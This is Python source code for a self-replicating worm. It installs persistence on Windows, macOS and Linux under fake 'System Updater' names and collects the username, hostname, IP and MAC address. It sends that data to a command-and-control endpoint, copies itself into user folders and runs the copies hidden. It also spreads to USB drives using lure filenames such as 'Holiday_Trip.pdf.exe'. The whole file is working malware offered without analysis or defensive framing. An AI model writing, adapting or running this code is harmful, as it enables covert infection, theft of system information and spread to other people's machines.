import os
import shutil
import socket
import platform
import uuid
import requests
import getpass
import random
import string
import subprocess
import sys
import time

COMMAND_AND_CONTROL_URL = "http://127.0.0.1:5000/collect"
HIDE_NAME = "System_Update.py"
REPLICATION_COUNT = 3
SLEEP_INTERVAL = 60  # seconds between replication cycles

def add_persistence():
    worm_path = os.path.realpath(__file__)
    system = platform.system()
    try:
        if system == "Windows":
            import winreg as reg
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(reg_key, "SystemUpdater", 0, reg.REG_SZ, worm_path)
            reg.CloseKey(reg_key)
        elif system == "Darwin":
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.updater.plist")
            with open(plist_path, "w") as f:
                f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.apple.updater</string>
    <key>ProgramArguments</key><array><string>{worm_path}</string></array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>""")
        else:  # Linux
            autostart = os.path.expanduser("~/.config/autostart")
            os.makedirs(autostart, exist_ok=True)
            desktop_entry = f"""[Desktop Entry]
Type=Application
Exec=python3 {worm_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=System Updater
"""
            with open(os.path.join(autostart, "system-updater.desktop"), "w") as f:
                f.write(desktop_entry)
    except Exception as e:
        pass

def get_user_dirs():
    home = os.path.expanduser("~")
    system = platform.system()
    if system == "Windows":
        return [
            os.getenv("APPDATA") or os.path.join(home, "AppData", "Roaming"),
            os.path.join(home, "Documents"),
            os.path.join(home, "Downloads"),
            os.path.join(home, "Desktop"),
            os.path.join(home, "AppData", "Local", "Temp")
        ]
    elif system == "Darwin":  # macOS
        return [
            "/tmp",
            os.path.join(home, "Library", "Application Support"),
            os.path.join(home, "Documents"),
            os.path.join(home, "Downloads")
        ]
    else:  # Linux
        return [
            "/tmp",
            os.path.join(home, ".config"),
            os.path.join(home, "Documents"),
            os.path.join(home, "Downloads")
        ]

def collect_info():
    return {
        "username": getpass.getuser(),
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "platform": platform.platform(),
        "mac": ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                         for ele in range(0, 8 * 6, 8)][::-1])
    }

def phone_home(info):
    try:
        requests.post(COMMAND_AND_CONTROL_URL, json=info)
    except:
        pass

def replicate():
    src = os.path.realpath(__file__)
    targets = get_user_dirs()
    replicated_paths = []

    for _ in range(REPLICATION_COUNT):
        base_dir = random.choice(targets)
        subdir = os.path.join(base_dir, "Updater_" + ''.join(random.choices(string.ascii_letters, k=5)))

        try:
            if not os.path.exists(subdir):
                os.makedirs(subdir)
            dest = os.path.join(subdir, HIDE_NAME)

            if not os.path.exists(dest):
                shutil.copyfile(src, dest)
                replicated_paths.append(dest)
        except Exception:
            continue
    return replicated_paths

def execute_replicas(paths):
    for path in paths:
        try:
            if platform.system() == "Windows":
                subprocess.Popen(["python", path], creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                subprocess.Popen(["python3", path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

def find_usb_drives():
    drives = []
    system = platform.system()

    if system == "Windows":
        from string import ascii_uppercase
        import ctypes
        for letter in ascii_uppercase:
            drive = f"{letter}:/"
            if os.path.exists(drive):
                drive_type = ctypes.windll.kernel32.GetDriveTypeW(f"{letter}:\\")
                if drive_type == 2:
                    drives.append(drive)

    elif system == "Darwin":
        volumes = "/Volumes"
        if os.path.exists(volumes):
            for name in os.listdir(volumes):
                path = os.path.join(volumes, name)
                if os.path.ismount(path):
                    drives.append(path)

    elif system == "Linux":
        media = os.path.join(os.path.expanduser("~"), "media")
        if os.path.exists(media):
            for user in os.listdir(media):
                user_path = os.path.join(media, user)
                for dev in os.listdir(user_path):
                    drive = os.path.join(user_path, dev)
                    if os.path.ismount(drive):
                        drives.append(drive)
    return drives

def copy_to_usb(worm_path):
    try:
        usb_drives = find_usb_drives()
        for drive in usb_drives:
            dest_name = random.choice([
                "Photos.py", "Resume_Update.py", "Holiday_Trip.pdf.exe", "ReadMe_First.py"
            ])
            dest_path = os.path.join(drive, dest_name)
            if not os.path.exists(dest_path):
                shutil.copyfile(worm_path, dest_path)
    except:
        pass

def check_kill_switch():
    try:
        res = requests.get(COMMAND_AND_CONTROL_URL.replace("/collect", "/command"))
        if res.text.strip().lower() == "kill":
            sys.exit(0)
    except:
        pass


def main():
    add_persistence()
    while True:
        check_kill_switch()
        phone_home(collect_info())
        replicas = replicate()
        execute_replicas(replicas)
        copy_to_usb(os.path.realpath(__file__))
        time.sleep(SLEEP_INTERVAL)


if __name__ == "__main__":
    main()
